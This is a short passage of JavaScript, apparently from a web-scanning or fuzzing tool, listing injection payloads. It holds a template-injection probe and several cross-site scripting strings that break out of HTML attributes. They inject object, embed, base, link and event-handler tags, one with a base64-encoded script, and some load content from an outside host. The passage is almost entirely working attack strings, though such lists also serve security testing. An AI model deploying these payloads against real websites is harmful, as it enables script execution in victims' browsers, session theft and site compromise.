...
var aPayloads = ['aaa"${2*2}\'{{3*3}}<ddd>zzz', 
		 ...
		 'aaa"><object data=https://spqr.zz.mu/xss.html>zzz', 
		 'aaa"><embed src=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>zzz', 
		 'aaa"><base href=https://spqr.zz.mu/>zzz', 
		 'aaa"><link rel=import href=https://spqr.zz.mu/xss.svg>zzz', 
		 'aaa"><xxx onbeforescriptexecute=prompt(document.domain)>zzz', 
		 'aaa"><marquee width=1 loop=1 onfinish=alert(document.domain)>zzz', 
